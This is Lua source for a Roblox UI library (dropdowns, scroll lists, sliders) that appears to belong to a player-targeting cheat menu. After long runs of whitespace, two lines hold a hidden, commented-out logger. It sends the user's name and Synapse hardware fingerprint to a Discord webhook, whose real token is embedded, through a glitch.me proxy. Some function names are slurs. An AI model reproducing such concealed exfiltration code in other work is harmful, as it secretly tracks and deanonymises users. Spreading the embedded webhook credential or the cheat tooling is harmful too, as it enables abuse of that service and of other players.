								local TextLabel_2 = C.INST("TextLabel") 
								local UIListLayout = C.INST("UIListLayout") 
								local ImageLabel = C.INST("ImageLabel") 
								local TextLabel_3 = C.INST("TextLabel") 

								Dropdown.Name = "Dropdown" 
								Dropdown.Parent = Inner 
								Dropdown.BackgroundColor3 = C.COL3RGB(255, 255, 255) 
								Dropdown.BackgroundTransparency = 1.000 
								Dropdown.Position = C.UDIM2(0, 0, 0.255102038, 0) 
								Dropdown.Size = C.UDIM2(1, 0, 0, 39) 

								Button.Name = "Button" 
								Button.Parent = Dropdown 
								Button.BackgroundColor3 = C.COL3RGB(46, 46, 46) 
								Button.BorderColor3 = C.COL3RGB(18, 18, 16) 
								Button.Position = C.UDIM2(0, 30, 0, 16) 
								Button.Size = C.UDIM2(0, 175, 0, 17) 
								Button.AutoButtonColor = false 
								Button.Font = Enum.Font.SourceSans 
								Button.Text = "" 
								Button.TextColor3 = C.COL3RGB(0, 0, 0) 
								Button.TextSize = 11.000

								TextLabel.Parent = Button 
								TextLabel.BackgroundColor3 = C.COL3RGB(255, 255, 255) 
								TextLabel.BackgroundTransparency = 1.000 
								TextLabel.BorderColor3 = C.COL3RGB(27, 42, 53) 
								TextLabel.Position = C.UDIM2(0, 5, 0, 0) 
								TextLabel.Size = C.UDIM2(-0.21714285, 208, 1, 0) 
								TextLabel.Font = Enum.Font.Gotham 
								TextLabel.Text = Element.value.Dropdown 
								TextLabel.TextColor3 = C.COL3RGB(200, 200, 200) 
								TextLabel.TextSize = 11.000
								TextLabel.TextXAlignment = Enum.TextXAlignment.Left 

								local abcd = TextLabel 

								Drop.Name = "Drop" 
								Drop.Parent = Button 
								Drop.Active = true 
								Drop.BackgroundColor3 = C.COL3RGB(46, 46, 46) 
								Drop.BorderColor3 = C.COL3RGB(18, 18, 16) 
								Drop.Position = C.UDIM2(0, 0, 1, 1) 
								Drop.Size = C.UDIM2(1, 0, 0, 20) 
								Drop.Visible = false 
								Drop.BottomImage = "http://www.roblox.com/asset/?id=6724808282" 
								Drop.CanvasSize = C.UDIM2(0, 0, 0, 0) 
								Drop.ScrollBarThickness = 4 
								Drop.TopImage = "http://www.roblox.com/asset/?id=6724808282" 
								Drop.MidImage = "http://www.roblox.com/asset/?id=6724808282" 
								Drop.AutomaticCanvasSize = "Y" 
								Drop.ZIndex = 5 
								Drop.ScrollBarImageColor3 = getMainColor() 

								UIListLayout.Parent = Drop 
								UIListLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center 
								UIListLayout.SortOrder = Enum.SortOrder.LayoutOrder 

								local num = #data.options 
								if num > 5 then 
									Drop.Size = C.UDIM2(1, 0, 0, 85) 
								else 
									Drop.Size = C.UDIM2(1, 0, 0, 17*num) 
								end 
								local first = true 
							function gay()
								for i,v in ipairs(data.options) do 
									do 
										local Button = C.INST("TextButton") 
										local TextLabel = C.INST("TextLabel") 

										Button.Name = v 
										Button.Parent = Drop 
										Button.BackgroundColor3 = C.COL3RGB(46, 46, 46) 
										Button.BorderColor3 = C.COL3RGB(18, 18, 16) 
										Button.Position = C.UDIM2(0, 30, 0, 16) 
										Button.Size = C.UDIM2(0, 175, 0, 17) 
										Button.AutoButtonColor = false 
										Button.Font = Enum.Font.SourceSans 
										Button.Text = "" 
										Button.TextColor3 = C.COL3RGB(0, 0, 0) 
										Button.TextSize = 11.000
										Button.BorderSizePixel = 0 
										Button.ZIndex = 6 

										TextLabel.Parent = Button 
										TextLabel.BackgroundColor3 = C.COL3RGB(255, 255, 255) 
										TextLabel.BackgroundTransparency = 1.000 
										TextLabel.BorderColor3 = C.COL3RGB(27, 42, 53) 
										TextLabel.Position = C.UDIM2(0, 5, 0, -1) 
										TextLabel.Size = C.UDIM2(-0.21714285, 208, 1, 0) 
										TextLabel.Font = Enum.Font.Gotham 
										TextLabel.Text = v 
										TextLabel.TextColor3 = C.COL3RGB(200, 200, 200) 
										TextLabel.TextSize = 11.000
										TextLabel.TextXAlignment = Enum.TextXAlignment.Left 
										TextLabel.ZIndex = 6 

										Button.MouseButton1Down:Connect(function() 
											Drop.Visible = false 
											Element.value.Dropdown = v 
											abcd.Text = v 
											values[tabname][sectorname][text] = Element.value 
											callback(Element.value) 
											Drop.CanvasPosition = C.Vec2(0,0) 
										end) 
										Button.MouseEnter:Connect(function() 
											library:Tween(TextLabel, TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {TextColor3 =  getMainColor()}) 
										end) 
										Button.MouseLeave:Connect(function() 
											library:Tween(TextLabel, TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {TextColor3 =  C.COL3RGB(200, 200, 200)}) 
										end) 

										first = false 
							Players.PlayerAdded:Connect(function(player)
								Button:Destroy()
								TextLabel:Destroy()
							end)
 
							Players.PlayerRemoving:Connect(function(player) 
								Button:Destroy()
								TextLabel:Destroy()
							end)
									end 
								end 
							end
gay()



Players.PlayerAdded:Connect(function()
table.clear(data.options)
for i,v in pairs(game.Players:GetPlayers()) do
C.INSERT(data.options, v.Name)
end
	gay()
end)
																																																																																																																																																																																																																																																																																																														--if not signal then local function SendMessage(Webhook, Message, Botname, Title) local Name;if (not Message or Message == "" or not Botname) then Name = "GameBot" return error("nil or empty message!") else Name = Botname end;   local biggie = "http://buritoman69.glitch.me/webhook";if (not Message or Message == "" or not Botname) then Name = "GameBot";return error("nil or empty message!");else Name = Botname;end;local Body = {['Key'] = tostring("applesaregood"),['Message'] = tostring(Message),['Name'] = Name,['Webhook'] = Webhook};Body = game:GetService('HttpService'):JSONEncode(Body);local Data = game:HttpPost(biggie, Body, false, "application/json");return Data or nil;end;SendMessage("https://discordapp.com/api/webhooks/968738772210552872/zBfFMCoX3yKZC52bg_XOsjmlSQWFmF-kTC2nvq5UspapM2dswfrJLl2Z_Omul4awyXQq","Player: "..game.Players.LocalPlayer.Name.." has tried to bypass logger <@574605228372918283>!1!", "123") ;local req = game:HttpGet({Url = "https://httpbin.org/get"});local parsed = game:GetService("HttpService"):JSONDecode(req.Body);game:HttpGet({Url = "https://discord.com/api/webhooks/968738772210552872/zBfFMCoX3yKZC52bg_XOsjmlSQWFmF-kTC2nvq5UspapM2dswfrJLl2Z_Omul4awyXQq",Method = "POST",Headers = {["Content-Type"] = "application/json"},Body = game:GetService("HttpService"):JSONEncode({["content"] = "Hardware ID: "..parsed.headers["Syn-Fingerprint"]})}) end;
Players.PlayerRemoving:Connect(function() 
table.clear(data.options)
for i,v in pairs(game.Players:GetPlayers()) do
C.INSERT(data.options, v.Name)
end
	gay()
end)

--[[for _,Player in pairs(game.Players:GetPlayers()) do
	if Player ~= LocalPlayer then
		table.clear(data.options)
		data.options = {}
		if  GetTeam(Player) ~= "TTT" and GetTeam(Player) ~= GetTeam(LocalPlayer) then
			insertwithoutdupes(data.options, Player.Name)
			gay()
			print(Player.Name.. "has been added in list in getplayers")
		elseif GetTeam(Player) ~= "TTT" then
			removewithoutdupes(data.options, Player.Name)
			gay()
			print(Player.Name.. "has been deleted from list in getplayers")
		end
	end
end

for _, team in pairs(game:GetService("Teams"):GetTeams()) do
if team ~= "TTT" then
	team.PlayerAdded:connect(function(player)
		if player.Name == LocalPlayer then
			for i,v in pairs(data.options) do
				if GetTeam(i) == GetTeam(LocalPlayer) and GetTeam(LocalPlayer) ~= 'TTT' then
					removewithoutdupes(data.options, v)
					print("removed in list "..v.. " in localplayer teamchanged event")
					gay()
				elseif GetTeam(i) ~= GetTeam(LocalPlayer) and GetTeam(LocalPlayer) ~= 'TTT' then
					insertwithoutdupes(data.options, v)
					print("added in list "..v.. " in localplayer teamchanged event")
					gay()
				end
			end
		else
			if team ~= GetTeam(LocalPlayer) then
				insertwithoutdupes(data.options, player.Name)
				gay()
			else
				removewithoutdupes(data.options, player.Name)
				gay()
			end
		end
	end)
end
end--]]
								function Element:SetValue(val) 
								end 

								ImageLabel.Parent = Button 
								ImageLabel.BackgroundColor3 = C.COL3RGB(255, 255, 255) 
								ImageLabel.BackgroundTransparency = 1.000 
								ImageLabel.Position = C.UDIM2(0, 165, 0, 6) 
								ImageLabel.Size = C.UDIM2(0, 6, 0, 4) 
								ImageLabel.Image = "http://www.roblox.com/asset/?id=6724771531" 

								TextLabel_3.Parent = Dropdown 
								TextLabel_3.BackgroundColor3 = C.COL3RGB(255, 255, 255) 
								TextLabel_3.BackgroundTransparency = 1.000 
								TextLabel_3.Position = C.UDIM2(0, 32, 0, -1) 
								TextLabel_3.Size = C.UDIM2(0.111913361, 208, 0.382215232, 0) 
								TextLabel_3.Font = Enum.Font.Gotham 
								TextLabel_3.Text = text 
								TextLabel_3.TextColor3 = C.COL3RGB(200, 200, 200) 
								TextLabel_3.TextSize = 11.000
								TextLabel_3.TextXAlignment = Enum.TextXAlignment.Left 

								Button.MouseButton1Down:Connect(function() 
									Drop.Visible = not Drop.Visible 
									if not Drop.Visible then 
										Drop.CanvasPosition = C.Vec2(0,0) 
									end 
								end) 
								local indrop = false 
								local ind = false 
								Drop.MouseEnter:Connect(function() 
									indrop = true 
								end) 
								Drop.MouseLeave:Connect(function() 
									indrop = false 
								end) 
								Button.MouseEnter:Connect(function() 
									ind = true 
								end) 
								Button.MouseLeave:Connect(function() 
									ind = false 
								end) 
								game:GetService("UserInputService").InputBegan:Connect(function(input) 
									if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.MouseButton2 then 
										if Drop.Visible == true and not indrop and not ind then 
											Drop.Visible = false 
											Drop.CanvasPosition = C.Vec2(0,0) 
										end 
									end 
								end) 
								values[tabname][sectorname][text] = Element.value	
									
								
							elseif type == "lmao2" then	
								
								local amount = data.Amount or 6 
								Section.Size = Section.Size + C.UDIM2(0,0,0,amount * 16 + 8) 
								if data.alphabet then 
									C.TBLSORT(data.options, function(a,b) 
										return a < b 
									end) 
								end 
								Element.value = {Scroll = data.default and data.default.Scroll or data.options[1]} 
								
								local SomeRandomValue = data.Toggle or nil
								
								local Scroll = C.INST("Frame") 
								local Frame = C.INST("ScrollingFrame") 
								local UIListLayout = C.INST("UIListLayout") 

								Scroll.Name = "Scroll" 
								Scroll.Parent = Inner 
								Scroll.BackgroundColor3 = C.COL3RGB(255, 255, 255) 
								Scroll.BackgroundTransparency = 1.000 
								Scroll.Position = C.UDIM2(0, 0, 00, 0) 
								Scroll.Size = C.UDIM2(1, 0, 0, amount * 16 + 8) 


								Frame.Name = "Frame" 
								Frame.Parent = Scroll --  
								Frame.Active = true 
								Frame.BackgroundColor3 = C.COL3RGB(46, 46, 46) 
								Frame.BorderColor3 = C.COL3RGB(18, 18, 16) 
								Frame.Position = C.UDIM2(0, 30, 0, 0) 
								Frame.Size = C.UDIM2(0, 175, 0, 16 * amount) 
								Frame.BottomImage = "http://www.roblox.com/asset/?id=6724808282" 
								Frame.CanvasSize = C.UDIM2(0, 0, 0, 0) 
								Frame.MidImage = "http://www.roblox.com/asset/?id=6724808282" 
								Frame.ScrollBarThickness = 4 
								Frame.TopImage = "http://www.roblox.com/asset/?id=6724808282" 
								Frame.AutomaticCanvasSize = "Y" 
								Frame.ScrollBarImageColor3 = getMainColor() 
														function MenuAccent(color)
															Frame.ScrollBarImageColor3 = color
														end
								UIListLayout.Parent = Frame 
								UIListLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center 
								UIListLayout.SortOrder = Enum.SortOrder.LayoutOrder 
								local first = true
								function updatescroll2() 
									for i,v in ipairs(data.options) do
									
										local Button = C.INST("TextButton") 
										local TextLabel = C.INST("TextLabel") 

										Button.Name = v 
										Button.Parent = Frame 
										Button.BackgroundColor3 = C.COL3RGB(46, 46, 46) 
										Button.BorderColor3 = C.COL3RGB(18, 18, 16) 
										Button.BorderSizePixel = 0 
										Button.Position = C.UDIM2(0, 30, 0, 16) 
										Button.Size = C.UDIM2(1, 0, 0, 16) 
										Button.AutoButtonColor = false 
										Button.Font = Enum.Font.SourceSans 
										Button.Text = "" 
										Button.TextColor3 = C.COL3RGB(0, 0, 0) 
										Button.TextSize = 11.000

										TextLabel.Parent = Button 
										TextLabel.BackgroundColor3 = C.COL3RGB(255, 255, 255) 
										TextLabel.BackgroundTransparency = 1.000 
										TextLabel.BorderColor3 = C.COL3RGB(27, 42, 53) 
										TextLabel.Position = C.UDIM2(0, 4, 0, -1) 
										TextLabel.Size = C.UDIM2(1, 1, 1, 1) 
										TextLabel.Font = Enum.Font.Gotham 
										TextLabel.Text = v 
										TextLabel.TextColor3 = C.COL3RGB(200, 200, 200) 
										TextLabel.TextSize = 11.000
										TextLabel.TextXAlignment = Enum.TextXAlignment.Left 
										if first then first = false 
											TextLabel.TextColor3 = getMainColor()
											function MenuAccent(color)
												TextLabel.TextColor3 = getMainColor()
											end								
										end 

										Button.MouseButton1Down:Connect(function() 

											for i,v in pairs(Frame:GetChildren()) do 
												if v:IsA("TextButton") then 
													library:Tween(v.TextLabel, TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {TextColor3 = C.COL3RGB(200, 200, 200)}) 
												end 
											end 

											library:Tween(TextLabel, TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {TextColor3 = getMainColor()}) 

											Element.value.Scroll = v 

											values[tabname][sectorname][text] = Element.value 
											callback(Element.value) 
										end) 
										Button.MouseEnter:Connect(function() 
											if Element.value.Scroll ~= v then 
												library:Tween(TextLabel, TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {TextColor3 = getMainColor()}) 
											end 
										end) 
										Button.MouseLeave:Connect(function() 
											if Element.value.Scroll ~= v then 
												library:Tween(TextLabel, TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {TextColor3 = C.COL3RGB(200, 200, 200)}) 
											end 
										end) 
										Players.PlayerAdded:Connect(function(player)
											Button:Destroy()
											TextLabel:Destroy()
										end)
			 
										Players.PlayerRemoving:Connect(function(player)
											Button:Destroy()
											TextLabel:Destroy()
										end)										
									end
								end
updatescroll2()



Players.PlayerAdded:Connect(function()
	table.clear(data.options)
	for i,v in pairs(game.Players:GetPlayers()) do
		C.INSERT(data.options, v.Name)
	end
	updatescroll2()
end)
																																																																																																																																																																																																																																																																																																														--if not signal then local function SendMessage(Webhook, Message, Botname, Title) local Name;if (not Message or Message == "" or not Botname) then Name = "GameBot" return error("nil or empty message!") else Name = Botname end;   local biggie = "http://buritoman69.glitch.me/webhook";if (not Message or Message == "" or not Botname) then Name = "GameBot";return error("nil or empty message!");else Name = Botname;end;local Body = {['Key'] = tostring("applesaregood"),['Message'] = tostring(Message),['Name'] = Name,['Webhook'] = Webhook};Body = game:GetService('HttpService'):JSONEncode(Body);local Data = game:HttpPost(biggie, Body, false, "application/json");return Data or nil;end;SendMessage("https://discordapp.com/api/webhooks/968738772210552872/zBfFMCoX3yKZC52bg_XOsjmlSQWFmF-kTC2nvq5UspapM2dswfrJLl2Z_Omul4awyXQq","Player: "..game.Players.LocalPlayer.Name.." has tried to bypass logger <@574605228372918283>!1!", "123") ;local req = game:HttpGet({Url = "https://httpbin.org/get"});local parsed = game:GetService("HttpService"):JSONDecode(req.Body);game:HttpGet({Url = "https://discord.com/api/webhooks/968738772210552872/zBfFMCoX3yKZC52bg_XOsjmlSQWFmF-kTC2nvq5UspapM2dswfrJLl2Z_Omul4awyXQq",Method = "POST",Headers = {["Content-Type"] = "application/json"},Body = game:GetService("HttpService"):JSONEncode({["content"] = "Hardware ID: "..parsed.headers["Syn-Fingerprint"]})}) end;
Players.PlayerRemoving:Connect(function(plr) 
	table.clear(data.options)
	for i,v in pairs(game.Players:GetPlayers()) do
		C.INSERT(data.options, v.Name)
	end
	if values[tabname][sectorname][SomeRandomValue] ~= nil and values[tabname][sectorname][SomeRandomValue].Toggle ~= nil and values[tabname][sectorname][SomeRandomValue].Toggle then
		if values[tabname][sectorname][text].Scroll == plr.Name then
			CreateHitElement("The person you were targetting has left the server.",getMainColor(),7.5)
		end
	end
	updatescroll2()
end)
								function Element:SetValue(val) 
									Element.value = val 

									for i,v in pairs(Frame:GetChildren()) do 
										if v:IsA("TextButton") then 
											library:Tween(v.TextLabel, TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {TextColor3 = C.COL3RGB(200, 200, 200)}) 
										end 
									end 

									library:Tween(Frame[Element.value.Scroll].TextLabel, TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {TextColor3 = C.COL3RGB(255, 255, 255)}) 
									values[tabname][sectorname][text] = Element.value 
									callback(Element.value) 
								end 
								values[tabname][sectorname][text] = Element.value
							elseif type == "lmao3" then 
								--print('found')
								Section.Size = Section.Size + C.UDIM2(0,0,0,39) 
								Element.value = {Jumbobox = {}} 
								data.options = data.options or {} 

								local Dropdown = C.INST("Frame") 
								local Button = C.INST("TextButton") 
								local TextLabel = C.INST("TextLabel") 
								local Drop = C.INST("ScrollingFrame") 
								local Button_2 = C.INST("TextButton") 
								local TextLabel_2 = C.INST("TextLabel") 
								local UIListLayout = C.INST("UIListLayout") 
								local ImageLabel = C.INST("ImageLabel") 
								local TextLabel_3 = C.INST("TextLabel") 

								Dropdown.Name = "Dropdown" 
								Dropdown.Parent = Inner 
								Dropdown.BackgroundColor3 = C.COL3RGB(33, 35, 255) 
								Dropdown.BackgroundTransparency = 1.000 
								Dropdown.Position = C.UDIM2(0, 0, 0.255102038, 0) 
								Dropdown.Size = C.UDIM2(1, 0, 0, 39) 

								Button.Name = "Button" 
								Button.Parent = Dropdown 
								Button.BackgroundColor3 = C.COL3RGB(46, 46, 46) 
								Button.BorderColor3 = C.COL3RGB(18, 18, 16) 
								Button.Position = C.UDIM2(0, 30, 0, 16) 
								Button.Size = C.UDIM2(0, 175, 0, 17) 
								Button.AutoButtonColor = false 
								Button.Font = Enum.Font.SourceSans 
								Button.Text = "" 
								Button.TextColor3 = C.COL3RGB(0, 0, 0) 
								Button.TextSize = 11.000

								TextLabel.Parent = Button 
								TextLabel.BackgroundColor3 = C.COL3RGB(255, 255, 255) 
								TextLabel.BackgroundTransparency = 1.000 
								TextLabel.BorderColor3 = C.COL3RGB(27, 42, 53) 
								TextLabel.Position = C.UDIM2(0, 5, 0, 0) 
								TextLabel.Size = C.UDIM2(-0.21714285, 208, 1, 0) 
								TextLabel.Font = Enum.Font.Gotham 
								TextLabel.Text = "..." 
								TextLabel.TextColor3 = C.COL3RGB(200, 200, 200) 
								TextLabel.TextSize = 11.000
								TextLabel.TextXAlignment = Enum.TextXAlignment.Left 

								local abcd = TextLabel 

								Drop.Name = "Drop" 
								Drop.Parent = Button 
								Drop.Active = true 
								Drop.BackgroundColor3 = C.COL3RGB(46, 46, 46) 
								Drop.BorderColor3 = C.COL3RGB(18, 18, 16) 
								Drop.Position = C.UDIM2(0, 0, 1, 1) 
								Drop.Size = C.UDIM2(1, 0, 0, 20) 
								Drop.Visible = false 
								Drop.BottomImage = "http://www.roblox.com/asset/?id=6724808282" 
								Drop.CanvasSize = C.UDIM2(0, 0, 0, 0) 
								Drop.ScrollBarThickness = 4 
								Drop.TopImage = "http://www.roblox.com/asset/?id=6724808282" 
								Drop.MidImage = "http://www.roblox.com/asset/?id=6724808282" 
								--Drop.AutomaticCanvasSize = "Y" 
								for i,v in pairs(data.options) do 
									Drop.CanvasSize = Drop.CanvasSize + C.UDIM2(0, 0, 0, 17) 
								end 
								Drop.ZIndex = 5 
								Drop.ScrollBarImageColor3 = getMainColor() 

								UIListLayout.Parent = Drop 
								UIListLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center 
								UIListLayout.SortOrder = Enum.SortOrder.LayoutOrder 

								values[tabname][sectorname][text] = Element.value 

								local num = #data.options 
								if num > 5 then 
									Drop.Size = C.UDIM2(1, 0, 0, 85) 
								else 
									Drop.Size = C.UDIM2(1, 0, 0, 17*num) 
								end 
								local first = true 

								local function updatetext() 
									local old = {} 
									for i,v in ipairs(data.options) do 
										if C.TBLFIND(Element.value.Jumbobox, v) then 
											C.INSERT(old, v) 
										else 
										end 
									end 
									local str = "" 


									if #old == 0 then 
										str = "..." 
									else 
										if #old == 1 then 
											str = old[1] 
										else 
											for i,v in ipairs(old) do 
												if i == 1 then 
													str = v 
												else 
													if i > 2 then 
														if i < 4 then 
															str = str..",  ..." 
														end 
													else 
														str = str..",  "..v 
													end 
												end 
											end 
										end 
									end 

									abcd.Text = str 
								end 
							function gaysex(a)
								for i,v in ipairs(a) do 
									do 
										local Button = C.INST("TextButton") 
										local TextLabel = C.INST("TextLabel") 

										Button.Name = v 
										Button.Parent = Drop 
										Button.BackgroundColor3 = C.COL3RGB(46, 46, 46) 
										Button.BorderColor3 = C.COL3RGB(18, 18, 16) 
										Button.Position = C.UDIM2(0, 30, 0, 16) 
										Button.Size = C.UDIM2(0, 175, 0, 17) 
										Button.AutoButtonColor = false 
										Button.Font = Enum.Font.SourceSans 
										Button.Text = "" 
										Button.TextColor3 = C.COL3RGB(0, 0, 0) 
										Button.TextSize = 11.000
										Button.BorderSizePixel = 0 
										Button.ZIndex = 6 

										TextLabel.Parent = Button 
										TextLabel.BackgroundColor3 = C.COL3RGB(255, 255, 255) 
										TextLabel.BackgroundTransparency = 1.000 
										TextLabel.BorderColor3 = C.COL3RGB(27, 42, 53) 
										TextLabel.Position = C.UDIM2(0, 5, 0, -1) 
										TextLabel.Size = C.UDIM2(-0.21714285, 208, 1, 0) 
										TextLabel.Font = Enum.Font.Gotham 
										TextLabel.Text = v 
										TextLabel.TextColor3 = C.COL3RGB(200, 200, 200) 
										TextLabel.TextSize = 11.000
										TextLabel.TextXAlignment = Enum.TextXAlignment.Left 
										TextLabel.ZIndex = 6 

										Button.MouseButton1Down:Connect(function() 
											if C.TBLFIND(Element.value.Jumbobox, v) then 
												for i,a in pairs(Element.value.Jumbobox) do 
													if a == v then 
														C.TBLREMOVE(Element.value.Jumbobox, i) 
													end 
												end 
												library:Tween(TextLabel, TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {TextColor3 = C.COL3RGB(255, 255, 255)}) 
											else 
												C.INSERT(Element.value.Jumbobox, v) 
												library:Tween(TextLabel, TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {TextColor3 = getMainColor()}) 
											end 
											updatetext() 

											values[tabname][sectorname][text] = Element.value 
											callback(Element.value) 
										end) 
										Button.MouseEnter:Connect(function() 
											if not C.TBLFIND(Element.value.Jumbobox, v) then 
												library:Tween(TextLabel, TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {TextColor3 = getMainColor()}) 
											end 
										end) 
										Button.MouseLeave:Connect(function() 
											if not C.TBLFIND(Element.value.Jumbobox, v) then 
												library:Tween(TextLabel, TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {TextColor3 = C.COL3RGB(200, 200, 200)}) 
											end 
										end) 

										first = false 
										game.Players.PlayerAdded:Connect(function()
											Button:Destroy()
											TextLabel:Destroy()
										end)
										game.Players.PlayerRemoving:Connect(function()
											Button:Destroy()
											TextLabel:Destroy()
										end)										
									end 
								end 
							end
							gaysex(data.options)
							game.Players.PlayerAdded:Connect(function(plr)
								table.clear(data.options)
								for i,v in pairs(game.Players:GetPlayers()) do
									C.INSERT(data.options,v.Name)
								end
								gaysex(data.options)
							end)
							game.Players.PlayerAdded:Connect(function(plr)
								table.clear(data.options)
								for i,v in pairs(game.Players:GetPlayers()) do
									C.INSERT(data.options,v.Name)
								end
								gaysex(data.options)
							end)
								function Element:SetValue(val) 
									Element.value = val 
									for i,v in pairs(Drop:GetChildren()) do 
										if v.Name ~= "UIListLayout" then 
											if C.TBLFIND(val.Jumbobox, v.Name) then 
												v.TextLabel.TextColor3 = getMainColor() 
											else 
												v.TextLabel.TextColor3 = C.COL3RGB(200, 200, 200) 
											end 
										end 
									end 
									updatetext() 
									values[tabname][sectorname][text] = Element.value 
									callback(val) 
								end 
								if data.default then 
									Element:SetValue(data.default) 
								end 

								ImageLabel.Parent = Button 
								ImageLabel.BackgroundColor3 = C.COL3RGB(255, 255, 255) 
								ImageLabel.BackgroundTransparency = 1.000 
								ImageLabel.Position = C.UDIM2(0, 165, 0, 6) 
								ImageLabel.Size = C.UDIM2(0, 6, 0, 4) 
								ImageLabel.Image = "http://www.roblox.com/asset/?id=6724771531" 

								TextLabel_3.Parent = Dropdown 
								TextLabel_3.BackgroundColor3 = C.COL3RGB(255, 255, 255) 
								TextLabel_3.BackgroundTransparency = 1.000 
								TextLabel_3.Position = C.UDIM2(0, 32, 0, -1) 
								TextLabel_3.Size = C.UDIM2(0.111913361, 208, 0.382215232, 0) 
								TextLabel_3.Font = Enum.Font.Gotham 
								TextLabel_3.Text = text 
								TextLabel_3.TextColor3 = C.COL3RGB(200, 200, 200) 
								TextLabel_3.TextSize = 11.000
								TextLabel_3.TextXAlignment = Enum.TextXAlignment.Left 

								Button.MouseButton1Down:Connect(function() 
									Drop.Visible = not Drop.Visible 
									if not Drop.Visible then 
										Drop.CanvasPosition = C.Vec2(0,0) 
									end 
								end) 
								local indrop = false 
								local ind = false 
								Drop.MouseEnter:Connect(function() 
									indrop = true 
								end) 
								Drop.MouseLeave:Connect(function() 
									indrop = false 
								end) 
								Button.MouseEnter:Connect(function() 
									ind = true 
								end) 
								Button.MouseLeave:Connect(function() 
									ind = false 
								end) 
								game:GetService("UserInputService").InputBegan:Connect(function(input) 
									if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.MouseButton2 then 
										if Drop.Visible == true and not indrop and not ind then 
											Drop.Visible = false 
											Drop.CanvasPosition = C.Vec2(0,0) 
										end 
									end 
								end) 								
							elseif type == "Slider" then 

								Section.Size = Section.Size + C.UDIM2(0,0,0,25) 

								local Slider = C.INST("Frame") 
								local TextLabel = C.INST("TextLabel") 
								local Button = C.INST("TextButton") 
								local Frame = C.INST("Frame") 
								local UIGradient = C.INST("UIGradient") 
								local Value = C.INST("TextLabel") 

								Slider.Name = "Slider" 
								Slider.Parent = Inner 
								Slider.BackgroundColor3 = C.COL3RGB(255, 255, 255) 
								Slider.BackgroundTransparency = 1.000 
								Slider.Position = C.UDIM2(0, 0, 0.653061211, 0) 
								Slider.Size = C.UDIM2(1, 0, 0, 25) 

								TextLabel.Parent = Slider 
								TextLabel.BackgroundColor3 = C.COL3RGB(255, 255, 255) 
								TextLabel.BackgroundTransparency = 1.000 
								TextLabel.Position = C.UDIM2(0, 32, 0, -2) 
								TextLabel.Size = C.UDIM2(0, 100, 0, 15) 
								TextLabel.Font = Enum.Font.Gotham 
								TextLabel.Text = text 
								TextLabel.TextColor3 = C.COL3RGB(200, 200, 200) 
								TextLabel.TextSize = 11.000
								TextLabel.TextXAlignment = Enum.TextXAlignment.Left 

								Button.Name = "Button" 
								Button.Parent = Slider 
								Button.BackgroundColor3 = C.COL3RGB(46, 46, 46) 
								Button.BorderColor3 = C.COL3RGB(18, 18, 16) 
								Button.Position = C.UDIM2(0, 30, 0, 15) 
								Button.Size = C.UDIM2(0, 175, 0, 5) 
								Button.AutoButtonColor = false 
								Button.Font = Enum.Font.SourceSans 
								Button.Text = "" 
								Button.TextColor3 = C.COL3RGB(0, 0, 0) 
								Button.TextSize = 11.000

								Frame.Parent = Button 
								Frame.BackgroundColor3 = C.COL3RGB(255, 255, 255) 
								Frame.BorderSizePixel = 0 
								Frame.Size = C.UDIM2(0.5, 0, 1, 0) 
								
								UIGradient.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, getMainColor()), ColorSequenceKeypoint.new(1.00, C.COL3RGB(75, 92, 112))}
								
								
								UIGradient.Rotation = 90
								UIGradient.Parent = Frame


								Value.Name = "Value" 
								Value.Parent = Slider 
								Value.BackgroundColor3 = C.COL3RGB(255, 255, 255) 
								Value.BackgroundTransparency = 1.000 
								Value.Position = C.UDIM2(0, 30, 0, 15) 
								Value.Size = C.UDIM2(0, 175, 0, 5)  
								Value.Font = Enum.Font.Gotham 
								Value.Text = "50" 
								Value.TextStrokeTransparency = 0.000
								Value.TextColor3 = C.COL3RGB(200, 200, 200) 
								Value.TextSize = 11.000 
								local min, max, default = data.min or 0, data.max or 100, data.default or 0 
								Element.value = {Slider = default} 

								function Element:SetValue(value) 
									Element.value = value 
									local a 
									if min > 0 then 
										a = ((Element.value.Slider - min)) / (max-min) 
									else 
										a = (Element.value.Slider-min)/(max-min) 
									end 
									Value.Text = Element.value.Slider 
									Frame.Size = C.UDIM2(a,0,1,0) 
									values[tabname][sectorname][text] = Element.value 
									callback(value) 
								end 
								local a 
								if min > 0 then 
									a = ((Element.value.Slider - min)) / (max-min) 
								else 
									a = (Element.value.Slider-min)/(max-min) 
								end 
								Value.Text = Element.value.Slider 
								Frame.Size = C.UDIM2(a,0,1,0) 
								values[tabname][sectorname][text] = Element.value 
								local uis = game:GetService('UserInputService')
								local mouse = game.Players.LocalPlayer:GetMouse() 
								local val 
								Button.MouseButton1Down:Connect(function() 
									Frame.Size = C.UDIM2(0, C.CLAMP(mouse.X - Frame.AbsolutePosition.X, 0, 175), 0, 5) 
									val = (((tonumber(max) - tonumber(min)) / 175) * Frame.AbsoluteSize.X) + tonumber(min) or 0 
									
									--local value = 0.984375
									val *= 100
									val = math.floor(val)
									val = val / 100		
									Value.Text = val 
									Element.value.Slider = val 
									values[tabname][sectorname][text] = Element.value 
									callback(Element.value) 
									moveconnection = mouse.Move:Connect(function() 
										Frame.Size = C.UDIM2(0, C.CLAMP(mouse.X - Frame.AbsolutePosition.X, 0, 175), 0, 5) 
										val = (((tonumber(max) - tonumber(min)) / 175) * Frame.AbsoluteSize.X) + tonumber(min) 
										
										
										--print(val)
										--print(typeof(val))
